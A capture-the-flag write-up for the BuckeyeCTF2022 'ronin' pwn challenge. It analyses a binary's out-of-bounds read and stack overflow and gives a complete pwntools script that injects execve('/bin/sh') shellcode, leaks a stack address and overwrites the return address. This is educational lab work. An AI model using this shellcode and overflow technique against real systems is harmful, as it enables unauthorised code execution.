# BuckeyeCTF2022 Ronin Challenge | Thomas Spencer

> Category `pwn` | Difficulty: `medium`

# Recon

## File

`
ronin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eb4ccdef02a96139df6de419cbc283e0f26f1d85, for GNU/Linux 3.2.0, not stripped
`

## Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

NX, RWX, and no canary means we probably can do a shellcode injection!


# Functions

## Main

* Asks for user input

    * No buffer overflow

* Progress if we enter the string `"Chase after it."` as the first bit of our input

    * This means we can fill the rest of the buffer (size 80) with whatever we want!

## Chase

* Entered by typing `"Chase after it."` in `main`

* Has a local array of 4 strings


> "The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n";

> "Tall, thick trees surround you. You can't see a thing. Best to go back.\n";

> "You found the monkey! You continue your pursuit.\n";

> "You find a clearing with a cute lake, but nothing else. Turning around.\n";


* Function takes in a user input, and will call the `search` with the chosen string

* Only checks if the user choice is less than 4

    * This means we can input a negative value since our input is a signed integer

## Search

* Will just print out the text from the previous function

    * Unless the user input was 2 (find monkey string), then we go into the encounter function

    * **Notice: after the encounter function call is an `exit(0)` call!**

## Encounter

* Clears the input

* Prints out some text

* Uses `fgets(s, 49, stdin)` on a buffer of size `32`

    * This means we can overflow saved RBP and saved RIP only


# Vulnerabilites

* Buffer Overflow in `encounter` function

    * Will have to be last because of the `exit(0)` call afterwards

* Out of bounds read on the string array in `chase`

    * Only negative values allowed

    * Output will be simply printed out, and we can keep looping this indefinetly

# Plan of Attack

* NX enabled and RWX means we should make some shellcode. A simple `execl('/bin/bash', ...)` will do

* We'll have to leak the stack address (particularily of the array in main) to find our shellcode

    * Will have to be done with the out of bound read in `chase`

# Exploit Outline

* Enter main, put `"Chase after it."` + `shellcode` as our input

* Run through `search` with a valid string to seed the stack with proper data

* Run through `search` again with a negative offset to leak saved RBP

    * This saved RBP will be for the `chase` function!

* Use the leak to find the address of our shellcode

* Enter `encounter` and overflow RIP to jump to our shellcode

* Profit B)

# TODO:

* Need to figure out why the offset is saved RBP to shellcode offset is `0x50`

* Need to figure out why the offset to leak the saved RBP is `(0x10 + 0x8 + 0x8) // 0x8 = 4`

# Final Script

```python
#!/bin/env python3
from pwn import *

FILE = "./ronin"

DEBUG = False 

context.arch = "amd64"
context.encoding = "latin"

if (DEBUG):
	context.log_level = "debug"

warnings.simplefilter("ignore")

shellcode = asm("\n".join([
	"xor rax, rax",
	"push rax",
	"mov rax, 0x3b",
	"lea rdi, [rip+binsh]",
	"push rdi",
	"mov rsi, rsp",
	"xor rdx, rdx",
	"syscall",
	"binsh:",
	".string \"/bin/sh\"",
]))

LEAK_OFFSET = 0x10 + 0x8 + 0x8
SHELLCODE_OFFSET = 0x50 - len(b'Chase after it.')

p = process([FILE])

if (DEBUG):
	input("Attach Now!")

# Part 1, inject shellcode
p.recvuntil(b'You look up to see a monkey wielding your sword! What will you do?')
p.sendline(b'Chase after it.' + shellcode)

# Part 2, seed stack
p.recvuntil(b'far. Which way will you look? ')
p.sendline(b'0')

# Part 3, leak data
p.recvuntil(b'The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n')
p.sendline(str(-LEAK_OFFSET // 8).encode())

RBPLEAK = p.recv(8)
RBPLEAK = int.from_bytes(RBPLEAK, "little")
print(hex(RBPLEAK))

# Part 4, Overflow
p.sendline(b'2')
p.recvuntil(b'This monkey can talk. "Tell me a joke." ')

payload  = b'A'*0x20
payload += b'B'*0x8
payload += p64(RBPLEAK - SHELLCODE_OFFSET)

p.sendline(payload)

p.interactive()
p.close()
```